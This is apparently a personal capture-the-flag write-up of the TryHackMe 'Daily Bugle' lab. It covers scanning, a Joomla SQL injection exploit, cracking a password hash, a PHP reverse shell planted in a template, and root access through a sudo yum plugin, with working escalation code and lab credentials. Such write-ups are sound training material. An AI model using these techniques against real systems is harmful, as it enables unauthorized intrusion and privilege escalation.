### Daily bugle

the [room](https://tryhackme.com/room/dailybugle)


# Starting

ok,let's go start this machine

```bash
export ip=10.10.208.176
echo $ip
```
as always i'll run nmap and i'm going to see if an web server exists

```bash
sudo nmap -sS -p- $ip -T4 -vv
```

ok,they have a web page...let me see what i find while gobuster is running

```bash
gobuster dir -w /usr/share/wordlists/sec-lists/Discovery/Web-Content/directory-list-2.3-big.txt -u $ip -x js,txt,php
```

ok, the web page is about a spider man robing a bank and have a interesting somethings, like a login fields a lot of directories that gobuster found.

the web site uses php and has a lot of parameters that i can try include something evil

this machine use something like Joomla, i don't know what is this but in readme.txt directory is saied a few interesting things.

like that joomla allows extensions :)

the content of robots.txt made me believe that this web server is misconfigured

i can access all of this directories that is in robots.txt file

~~~
Disallow: /administrator/  #login page
Disallow: /bin/
Disallow: /cache/
Disallow: /cli/
Disallow: /components/
Disallow: /includes/
Disallow: /installation/
Disallow: /language/
Disallow: /layouts/
Disallow: /libraries/
Disallow: /logs/
Disallow: /modules/
Disallow: /plugins/
Disallow: /tmp/
~~~

a few of this directories doesn't have anything, maybe i can run gobuster to brute force directories in these too,but it's so boring bro

i wanna believe that i won't need to do this

now what i'll do is take a look at all of these :) 

i could find the joomla version

	/administrator/manifests/files/joomla.xml

and the version is in this xml, i found it because i was search about how i would create a script that discover joomla version and i decide to try if this file had read permission :)

looks like this version has a SQL injection and i'm gonna search for an exploit

[exploit that i used](https://github.com/teranpeterson/Joomblah)

```bash
python3 joomblah.py $ip

Found table: fb9j5_users
Extracting users from fb9j5_users
Found user ['811', 'Super User', 'jonah', 'jonah@tryhackme.com', '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm', '', '']

```

```bash
john hash wordlist=/usr/share/wordlists/rockyou.txt 
```

after maybe 20 minutes john breaked this hash omg 

user: jonah
password: spiderman123

ok,now i have a administrator account.

i've successfully logged in web page /administrator and it looks like a word press admin panel or something like this

maybe i can update a php reverse shell as template or plugin?

yea,it works. I've updated the code in index.php file of the main template and now i'm inside the machine as apache user

and after this it was easy

i didn't have anything in contrab or suid permissions,any password or somethings like this

i was having a few errors with grep to find something interesting so i did the linpeas and he founds an password on php file, thanks god i'm really was tired of this

$pass = 'nv5uz9r3ZEDzVjNu'

and now

```bash
ssh jjameson@$ip  
```

now as i can the jjameson user and his password i can get the user.txt flag and see if i can do something for privilege escalation

```bash
sudo -l  
```

i can run /usr/bin/yum as sudo :)

```bash
TF=$(mktemp -d) #create a tmp directory and saves in TF variable

cat >$TF/x<<EOF
[main]
plugins=1
pluginpath=$TF
pluginconfpath=$TF
EOF

cat >$TF/y.conf<<EOF
[main]
enabled=1
EOF

cat >$TF/y.py<<EOF
import os
import yum
from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
requires_api_version='2.1'
def init_hook(conduit):
  os.execl('/bin/sh','/bin/sh')
EOF

sudo yum -c $TF/x --enableplugin=y #make the yum run y.py as sudo

```

explanation about "cat >$TF/x<<EOF" command

">" this operator outputs to a somewhere
e.g. 

```bash
echo "a" > a.txt
```
the output of echo command will be sended to a.txt file 

in this case cat output is sended to variable $TF/x that is, the temp directory that i created before and a new file that will be created. so,the output of cat command will be sended to x file in tmp directory

"<<" this is different, "here string" it's an way to enter a multiline string until the tag after this operand.

e.g.

```bash
$ cat > test << STOPTAG
> Now i can insert anything i want 
> if i put this STOPTAG here, the multiline don't stop because there has other words so the shell read all of these as strings
>  	STOPTAG
> the same thing occours if i put an space before the tag
> but if i put in this way, it's stopped
> STOPTAG

$ echo test
Now i can insert anything i want 
if i put this STOPTAG here, the multiline don't stop because there has other words so the shell read all of these as strings
  	STOPTAG
the same thing occours if i put an space before the tag
but if i put in this form, it's stopped
```
so, "cat >" is used to write for what the cat reads from terminal and sends it to test file

a little bit confusing ha

makes more sense when you understand the cat command 

because the cat command works of this way

```bash
$ cat 

a # your input
a # cat reads and send your output to terminal too

b # your input
b # cat output
```

```bash
$ cat > test2.txt

a # your input
b # your input

$ cat test2.txt
a 
b
```

i was thinking to do some hackthebox machines because thm box are a little bit easier i think so 